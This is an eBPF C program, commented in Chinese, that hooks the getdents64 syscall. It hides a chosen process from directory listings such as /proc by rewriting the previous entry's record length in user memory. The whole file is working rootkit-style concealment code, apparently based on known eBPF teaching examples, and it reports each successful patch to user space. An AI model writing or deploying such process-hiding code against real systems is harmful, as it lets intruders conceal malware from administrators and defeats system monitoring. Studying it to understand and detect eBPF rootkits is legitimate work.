#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "GPL";

//全局变量区
volatile int target_ppid = 0;

//宏定义
#define MAX_PID_LEN 10
//只
const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN] = {0};

// map映射表 存储dents 缓冲区的地址
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, u32);
    __type(value, u64);
} map_buffs SEC(".maps");

// map映射表，key是pid_tgid,value是已读取的字节位置
// 断点续读，ebpf循环的限制为最大200次，map_bytes_read用来记录读取位置，实现大目录的分批读取
// 进度跟踪：记录每个进程的目录读取进度
//第一次执行：从头开始读取目录项
//如果 200 次循环后还有未读数据：
//1、保存当前读取位置到 map_bytes_read
//2、通过尾调用重新执行函数
//3、新的执行从保存的位置继续读取
//直到读完所有数据
//这是一种典型的eBPF编程模式。确保在ebpf程序循环限制下，也能完整处理大型目录的众多内容
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, u32);
    __type(value, u32);
} map_bytes_read SEC(".maps");

// map映射表，存储程序的尾调用的索引
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, u32);
    __type(value, u32);
}map_prog_array SEC(".maps");


//map映射表，存储实际的地址
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, u32);
    __type(value, u64);
} map_to_patch SEC(".maps");

// 环形缓冲区，用于想用户空间发送数据
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024); // 256KB 的缓冲区
} rb SEC(".maps");

//定义tracepoint处理函数
// 函数原型：int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
SEC("tracepoint/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    if(target_ppid != 0) {
        //检查是否是目标进程的子进程
        struct task_struct* task = (struct task_struct*)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if(ppid != target_ppid) {
            return 0;
        }
    }

    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];
    bpf_printk("getdents64 called with pid: %d, fd: %d, buff_count: %d\n", pid, fd, buff_count);

    // 获取目录项的缓冲区地址，并保存到映射表中
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];

    // 将pid_tgid对应的目录项缓冲区地址都存储到map中
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);
    
    return 0;
}

// 处理getdents64系统调用的退出事件
SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    //如果total_bytes_read为0, 没有读取到内容，则直接返回
    if(total_bytes_read <= 0) {
        return 0;
    }

    // 从map中获取pid_tgid对应的目录项的缓冲区地址
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if(!pbuff_addr) {
        bpf_printk("buff_addr is NULL\n");
        return 0;
    }

    // 迭代 200 个块中的文件列表，并查看其中是否有一个以我们的 pid 为名称的文件夹。
    // 如果我们找到它，则使用“bpf_tail_call”跳转到 handle_getdents_patch 进行实际修补
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];
    
    unsigned int bpos = 0;
    //获取当前读取的位置    
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if(!pBPOS) {
        bpf_printk("error:pBPOS is NULL\n");
        return 0;
    }

    bpos = *pBPOS;

    //循环200次处理目录项，读取数据
    for (int i = 0; i < 200; i++) {
        //如果读取位置大于等于总字节数，则表示已经读完所有数据，则退出循环
        if(bpos >= total_bytes_read) {
            break;
        }

        // 读取数据
        dirp = (struct linux_dirent64 *)(buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        //TODO:MAX_FILENAME_LEN need passed from userspace,not finished
        bpf_probe_read_user_str(filename, MAX_PID_LEN, &dirp->d_name);

        // 检查是否需要隐藏
        int j = 0;
        for(j = 0; j < pid_to_hide_len; j++) {
            if(filename[j] != pid_to_hide[j]) {
                break;
            }
        }
        
        if(j == pid_to_hide_len){
            //发现了文件夹,跳转到handle_getdents_patch函数，然后我们可以移除它!
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        //将目录项缓冲区地址添加到map_to_patch映射标中
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    //如果我们没找到对应目录项，并且还有内容没有读完，跳回此函数的开头继续查找
    if(bpos < total_bytes_read) {
        //更新已读取的位置
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        //尾调用自身，继续处理
        //PROG_01为handle_getdents_exit，为当前函数
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }

    //所有数据都读取完成，从map中删除对应的记录
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    //确保已检查并找到待隐藏的pid文件夹时，才进行patch
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if(NULL == pbuff_addr){
        //没找到，则直接返回
        return 0;
    }

    //Unlink target, by reading in previous linux_dirent64 struct, setting d_reclen to cover itself
    //1. 读取前一个目录项 previous entry
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)(buff_addr);
    short unsigned int d_reclen_previous = 0;
    //2. 读取前一个目录项的长度
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);
    
    //3. 读取要隐藏的目录项
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
    short unsigned int d_reclen = 0;
    //4. 读取要隐藏的目录项的长度
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // ===== 调试信息打印 =====
    //打印前一个目录下的文件名
    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(filename, MAX_PID_LEN, &dirp_previous->d_name);
    filename[MAX_PID_LEN - 1] = '\0';
    bpf_printk("file previous: %s\n", filename);
    
    //打印要隐藏的目录项的文件名
    bpf_probe_read_user_str(filename, pid_to_hide_len, &dirp->d_name);
    filename[pid_to_hide_len - 1] = '\0';
    bpf_printk("file next one: %s\n", filename);

    // ===== 执行隐藏操作 =====
    // 核心隐藏逻辑：修改前一个目录项的长度，使其跨过要隐藏的目录项
    // 新长度 = 前一个目录项上都 + 当前目录项长度
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    // 将新长度写到前一个目录项中
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // ===== 发送事件通知 =====
    // 通过环形缓冲区向用户空间发送操作结果
    struct event* e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e),  0);
    if(e){
        e->success = (ret == 0); //内容篡改操作是否成功
        e->pid = (pid_tgid >> 32);//pid值
        bpf_get_current_comm(&e->comm, sizeof(e->comm));//获取进程名称
        bpf_ringbuf_submit(e, 0);//提交事件
    }

    //从map中删除已处理的缓冲区地址
    bpf_map_delete_elem(&map_to_patch, &pid_tgid);

    return 0;
}



